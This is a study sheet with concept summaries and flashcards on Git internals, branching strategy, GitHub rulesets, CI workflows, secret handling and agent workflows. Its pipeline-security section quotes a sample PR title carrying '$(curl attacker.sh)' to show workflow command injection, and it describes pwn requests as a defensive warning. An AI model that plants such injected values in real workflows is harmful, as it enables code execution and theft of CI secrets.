title: Git & GitHub
note: Git as a graph of snapshots with movable pointers, history shape as team strategy, and the pipeline as a trust boundary. Platform features are dated Nov 2026; command syntax and vendor catalogs live in the official docs.

concepts.s: Git is a content-addressed graph of snapshots with movable labels, your team's integration strategy is the shape you give that graph, and the pipeline around it is an attack surface.

x.b:
• Storage: commits are immutable snapshots linked to parents; branches, tags and HEAD are pointers. Almost nothing is lost until garbage collection.
  • History shape: merge, rebase, squash and branch lifetime decide what history says and how often main breaks.
  • Trust boundary: rulesets, tokens, CI workflows and secrets decide who and what can change main.
Trap: Learning commands before the model. Every confusing Git moment is a question about which pointer moved.
"I lost my commits after a reset": a pointer moved, the snapshots still exist, the reflog finds them.

cards.q: After a bad reset, why is committed work usually still recoverable?
cards.a: Commits are immutable objects; reset only moved a pointer, and the reflog records where it was.

cards.q: Which layer of the Git map does a leaked CI token belong to?
cards.a: The trust boundary: tokens, workflows and rulesets controlling who can change main.

concepts.n: Objects, refs and the three trees
concepts.s: A commit is a snapshot plus parents and metadata, a branch is a file holding one commit ID, and your work moves between the working tree, the index and HEAD.

x.b:
• Objects (blobs, trees, commits, tags) are addressed by the hash of their content, so identical content is stored once and history can't change silently.
  • Refs: branches and tags point at commits; HEAD points at the current branch; remote-tracking refs (origin/main) record the last fetch.
  • Three trees: working tree (files on disk), index (the next commit, staged), HEAD (the last commit).
Trap: Detached HEAD: commits made there belong to no branch and become unreachable when you switch away. Create a branch first.

git add -p        # stage part of a file into the index
git diff          # working tree vs index
git diff --staged # index vs HEAD

cards.q: You ran git add on a change and now git diff shows nothing. Where is it, and how do you see it?
cards.a: In the index; git diff --staged compares the index with HEAD.

cards.q: What does a branch actually store?
cards.a: A pointer to one commit ID; history comes from following that commit's parents.

concepts.s: Pick the undo by blast radius: restore files, reset local commits, revert anything pushed, and use the reflog to find whatever you lost.

x.b:
• restore discards or unstages file changes; switch changes branches.
  • reset moves a branch locally: --soft keeps changes staged, --mixed unstaged, --hard discards.
  • revert adds an inverse commit; safe on shared branches.
  • reflog logs every position HEAD and branches held, locally only, kept by default about 90 days (30 for unreachable entries).

Trap: reset --hard with uncommitted edits: never-staged work is gone for good. Stash first.
Trap: Reverting a merge (git revert -m 1), then re-merging the branch: the reverted changes don't come back. Revert the revert.

git reflog                 # find the lost tip, e.g. HEAD@{4}
git branch rescue HEAD@{4}  # pin it before anything else

cards.q: You need to undo a commit already pulled by teammates. Which command?
cards.a: git revert: it adds an inverse commit without rewriting shared history.

cards.q: Why is an agent's unpushed work not in your reflog?
cards.a: The reflog is local to each clone; it lives in the agent's clone and dies with it unless pushed.

concepts.s: Merge preserves what happened, rebase replays your commits onto a new base for a straight line, and squash collapses a branch into one commit; never rewrite history others have pulled.

x.b:
• Merge: a merge commit with two parents; true history, noisier graph.
  • Rebase: new commits with new IDs on the new base; clean, but rewrites.
  • Squash merge: one commit on main per PR; easy revert, branch detail lost.
  • Interactive rebase (rebase -i) reorders, fixes up and splits local commits; cherry-pick copies one commit elsewhere.

Trap: Rebasing a shared branch, then force-pushing: everyone else's copy diverges.
Trap: Squash-merging the bottom of a hand-made stack orphans the next branch's base; rebase it with --onto.

git rebase -i main            # tidy local commits before the PR
git push --force-with-lease --force-if-includes  # never plain --force

cards.q: Your feature branch is shared with a teammate. Rebase or merge main into it?
cards.a: Merge (or coordinate); rebasing rewrites commits they already have.

cards.q: Why prefer --force-with-lease over --force?
cards.a: It refuses to overwrite the remote if someone pushed since your last fetch.

concepts.s: Find when and why something changed with bisect for regressions, blame for line origin, and the pickaxe for when a string appeared or vanished.

x.b:
• git bisect: binary search between a good and a bad commit; git bisect run automates it with a test script.
  • git blame -w -C: last change per line, ignoring whitespace and following moved code; ignore-revs files skip formatting commits.
  • git log -S"text" (pickaxe): commits where the count of a string changed; -G for a regex.
Trap: Blaming the formatter. A mass reformat owns every line until you list it in .git-blame-ignore-revs (set blame.ignoreRevsFile locally; GitHub reads it automatically).

git bisect start; git bisect bad HEAD; git bisect good v2.3
git bisect run ./test_metric.sh   # finds the first bad commit

cards.q: A metric broke somewhere in the last 400 commits and a script can detect it. Fastest tool?
cards.a: git bisect run with the script: about 9 test runs instead of 400.

cards.q: When did the function name calcRisk disappear from the codebase?
cards.a: git log -S"calcRisk" shows the commits that changed its occurrence count.

concepts.s: Integrate small changes into one always-releasable main at least daily, hiding unfinished work behind flags, and get environment separation from deployment config, not branches.

x.b: DORA's research associates trunk-based practice (few active branches, merged within a day) with higher delivery performance. GitHub flow is the same idea through short-lived PR branches. GitFlow (develop, release and hotfix branches) suits versioned releases; its author noted in 2020 it fits continuously delivered software poorly.

Trap: Long-lived dev/test/prod branches merged up monthly: conflicts pile up and nobody knows what is live.
Trap: Cherry-picking fixes between environment branches.
One main branch; Databricks bundle targets or Fabric deployment pipelines promote the same commit through dev, test and prod.
How long does the average branch live before merge, and could main deploy right now?

cards.q: A data team keeps dev, test and prod branches that drift apart. What replaces them?
cards.a: One main branch promoted through environments by deployment config (bundle targets, pipelines).

cards.q: When are release branches justified?
cards.a: When you ship versioned releases to customers, not when you deploy continuously.

concepts.s: Keep pull requests small and single-purpose, route review with CODEOWNERS, and add a merge queue once two green PRs can break main together.

x.b:
• Small PRs get faster, better review; stack dependent changes instead of one giant PR.
  • CODEOWNERS auto-requests owners by path; rulesets can require their approval.
  • A merge queue tests each PR combined with those ahead of it before merging. Workflows must run on merge_group or required checks never report.
  • Commit messages: a summary line plus why; trailers (Co-authored-by) record people and agents.
  • Stacks: git rebase --update-refs moves every branch in a chain at once.
  • Conventional Commits (feat:, fix:) make messages machine-readable for changelogs and versions.
Trap: Requiring a check that runs only on pull_request while the queue is on: every PR stalls.
Agents open many small PRs a day; enable the merge queue so two green PRs that conflict semantically can't break main.

cards.q: Two PRs both pass CI but main breaks after both merge. What prevents this?
cards.a: A merge queue that tests each PR together with the ones ahead of it.

cards.q: A merge queue is enabled and every PR is stuck waiting. Likely cause?
cards.a: Required workflows don't trigger on the merge_group event.

concepts.s: Protect main with rulesets that require pull requests and status checks, block force pushes and deletions, and keep the bypass list empty of automation identities.

x.b:
• Rulesets are named, layered policies for branches, tags and pushes; several can stack, and the most restrictive combination applies.
  • Common rules: require a PR with approvals and code owner review, required status checks, linear history, signed commits, merge queue; block force pushes (on by default).
  • Bypass lists name roles, teams or apps; keep them tiny.

Trap: Giving the agent's token admin or bypass rights: it can then merge its own unreviewed PR.
Trap: Requiring workflows on all branches blocks pushes to feature branches.
main: PR required, check "test" required, force pushes and deletions blocked, no bypass. The agent identity has only contents and pull_requests write.

cards.q: What must never be on a ruleset bypass list?
cards.a: The identity your agents or automation use.

cards.q: Two rulesets target main with different rules. Which applies?
cards.a: Both: rules stack and the most restrictive combination applies.

concepts.s: A workflow is triggered by an event, runs jobs on runners, and should build, test and deploy the same commit you reviewed.

x.b:
• Workflow YAML in .github/workflows; triggers such as pull_request, push, schedule, workflow_dispatch, merge_group.
  • Jobs run in parallel unless linked with needs; steps run in order; matrices fan out versions.
  • Environments add approvals and scoped secrets for deploy jobs.
  • Caching and concurrency groups keep runs fast and cancel superseded ones.
Trap: Deploying from a mutable branch name instead of the tested SHA: what you deploy may not be what passed.

on: [pull_request, merge_group]
jobs:
  test:
    runs-on: ubuntu-latest
    steps: [{uses: actions/checkout@<sha>}, {run: pytest -q}]

cards.q: How do you make a production deploy job wait for a human?
cards.a: Run it in a GitHub environment with required reviewers.

cards.q: Each push triggers a new run while old ones keep running. What setting fixes it?
cards.a: A concurrency group with cancel-in-progress.

concepts.n: The pipeline is an attack surface
concepts.s: Workflows hold credentials, so give GITHUB_TOKEN least privilege, use OIDC instead of stored cloud keys, pin actions to commit SHAs, and treat event data as hostile input.

x.b:
• Top-level permissions: contents: read; widen per job only where needed.
  • OIDC: short-lived cloud tokens trusted on claims like repo and environment; no stored keys.
  • Tags are mutable: the tj-actions/changed-files compromise (March 2025) exposed CI secrets. Pin SHAs; workflow lockfiles (GA since Oct 28, 2026) cover transitive actions.
  • Never interpolate ${{ github.event.* }} into run: scripts; pass through env. pull_request_target runs with secrets, so never execute PR code there.
Trap: After a compromised action ran, rotating nothing. Every secret the job could read is leaked.
A PR titled with $(curl attacker.sh) executes if the workflow echoes the title in run:. Pass it via env: and quote it.

cards.q: What is a "pwn request"?
cards.a: A pull_request_target workflow that checks out and runs untrusted PR code with the base repo's secrets and write token.

cards.q: Why does pinning @v4 not protect you?
cards.a: Tags are mutable (unless the action uses immutable releases); an attacker who controls the action can move the tag. Pin full commit SHAs.

concepts.s: Block secrets before push, and when one reaches a remote, rotate it first; rewriting history comes second and may not be worth it.

x.b:
• Push protection blocks recognized credentials at push; it is on by default for your own pushes to public repos; repository-level protection is free on public repos and needs GitHub Secret Protection on private ones. Bypasses are logged.
  • Response order: revoke or rotate, check audit logs, then if the data itself is sensitive, rewrite with git filter-repo --sensitive-data-removal, force-push, ask the host to purge PR refs and caches, have everyone re-clone.
  • Dependabot and CodeQL cover vulnerable dependencies and code.

Trap: Rewriting history and skipping rotation. The secret was harvestable the moment it was pushed.
Trap: One teammate pushing from an old clone reintroduces the rewritten data.
A database password lands in a public commit: rotate it within minutes, then decide whether a rewrite is worth breaking every SHA.

cards.q: A key hit a public repo an hour ago. First action?
cards.a: Revoke or rotate the key; history rewriting is secondary.

cards.q: Why can't a history rewrite guarantee the secret is gone?
cards.a: Forks, clones, PR refs and caches may keep the old commits.

concepts.s: Give every person phishing-resistant 2FA and every automation its own narrow, short-lived identity, so each action is attributable and revocable.

x.b:
• People: passkeys or security keys beat SMS or TOTP.
  • Personal automation: fine-grained PATs (chosen repos, permissions, expiry) over classic PATs.
  • Shared automation: GitHub Apps, whose installation tokens expire after an hour.
  • One server, one repo: a read-only deploy key.
  • Signing: SSH or GPG signing keys make commits Verified; rulesets can require it.
Trap: A classic PAT with repo scope in a CI secret: it reaches every repo you can, often never expires, and leaks with any compromised workflow.
Your coding agent runs as a GitHub App with contents and pull_requests write on three repos, cannot bypass rulesets, and signs its commits.

cards.q: Which credential type suits org-wide automation best, and why?
cards.a: A GitHub App: granular permissions, its own identity, tokens that expire after an hour.

cards.q: Your commit is signed but shows Unverified. Two common causes?
cards.a: The key was added only as an authentication key, not a signing key, or the commit email isn't verified on the account.

concepts.s: Keep repositories lean and reproducible: ignore build output, normalize line endings, keep large binaries out of Git, and choose monorepo or many repos by how changes move together.

x.b:
• .gitignore for generated files and local config; .gitattributes for line endings, diff and merge drivers.
  • Large or binary files bloat every clone forever; use Git LFS or object storage.
  • Monorepo: atomic cross-project changes, one toolchain, needs path-based CI. Many repos: clear ownership, harder cross-cutting changes. Submodules pin another repo's commit and confuse most users.
  • Hooks automate local checks; CI enforces them for real.
  • Sparse checkout and partial clone keep huge monorepos workable on a laptop.
Trap: Committing a 2 GB data file: deleting it later doesn't shrink history.
A data repo ignores .env and target/, stores sample data under 1 MB, and keeps real extracts in object storage.

cards.q: You deleted a large file in a new commit but clones are still huge. Why?
cards.a: The file remains in history; only a rewrite (or never committing it) removes it.

cards.q: When does a monorepo pay off?
cards.a: When changes routinely span projects and you can run path-based CI.

concepts.s: Treat Fabric and Databricks workspaces as checkouts of a Git branch, promote through PRs and deployment tooling, and keep query output and PHI out of commits.

x.b:
• Fabric: Git integration works per workspace, syncing supported items with cloud-hosted Azure DevOps or GitHub (including Enterprise Cloud); GitLab and self-hosted servers aren't supported. Unsupported item types are ignored. Branch out gives a developer a workspace for a feature branch.
  • Power BI: PBIP projects with TMDL give readable text diffs; PBIX files don't.
  • Databricks: Git folders clone repos into the workspace; bundles (Declarative Automation Bundles) deploy jobs and pipelines from CI; Databricks Connect runs local IDE code on remote compute; Terraform manages account and workspace infrastructure.

Trap: Committing .ipynb output (local Jupyter, or a Databricks admin allowing output commits): query results, possibly PHI, land in history. Strip outputs in a pre-commit hook and CI.
Trap: Editing production workspaces directly: they drift from main.
A developer branches out a Fabric workspace, edits a semantic model as TMDL and opens a PR; after merge the Dev workspace updates from main and a deployment pipeline promotes it to Test and Prod.

cards.q: A team wants to connect its Fabric workspace to GitLab. What do you tell them?
cards.a: Not supported: Fabric connects only to cloud-hosted Azure DevOps or GitHub.

cards.q: Why store Power BI models as PBIP/TMDL instead of PBIX?
cards.a: TMDL is text, so reviewers get readable diffs in PRs.

concepts.s: Microsoft shops often run Azure DevOps; most of its repo and pipeline concepts have close GitHub equivalents, and migration is about pipelines and identities more than code.

x.b:
• Branch policies map to rulesets; build validation to required status checks.
  • Pipeline templates map to reusable workflows or composite actions.
  • Variable groups and Key Vault links map to environment secrets or OIDC to Azure.
  • Service connections map to OIDC federated credentials on an Entra app registration.
  • Environments with approvals map to GitHub environments with required reviewers.
  • Work items stay in Boards, linked with AB#123 once the Azure Boards app is connected.
  • GitHub Enterprise Importer moves history, PRs and branch policies; Actions Importer drafts workflows; secrets, service connections and permissions are manual.

Trap: Migrating repos and forgetting pipeline identities: each Azure service connection needs a federated credential, whose subject must match the token's exactly, before the first deploy from GitHub.
An ADO build-validation policy on main becomes a ruleset requiring the "test" check on GitHub; the deploy service connection becomes OIDC to an Entra app.

cards.q: What is the GitHub equivalent of an Azure DevOps branch policy with build validation?
cards.a: A ruleset that requires a pull request and a status check.

cards.q: What must you rebuild by hand before the first GitHub deploy to Azure?
cards.a: The deploy identity: each service connection becomes an OIDC federated credential; Actions Importer doesn't migrate it.

concepts.s: Agents should work on their own branches or worktrees, commit small with attribution, push early, and merge only through the same protected path as humans.

x.b:
• One worktree or branch per agent task, so parallel agents don't collide.
  • Small commits with co-author trailers keep agent changes auditable.
  • Push early: an agent's container takes its unpushed commits and stashes with it.
  • Agents open PRs; required checks, review and the merge queue decide.
Trap: Letting the agent's identity bypass protection to "save time": you lose the review boundary that makes agents safe.
git worktree add ../task-142 -b agent/task-142   # isolated checkout per agent

cards.q: A cloud agent session ended and its work is gone. What rule prevents this?
cards.a: Push branches early and often; unpushed work dies with the container.

cards.q: Why give each parallel agent its own worktree?
cards.a: Each gets an isolated checkout and branch, so their edits don't collide.
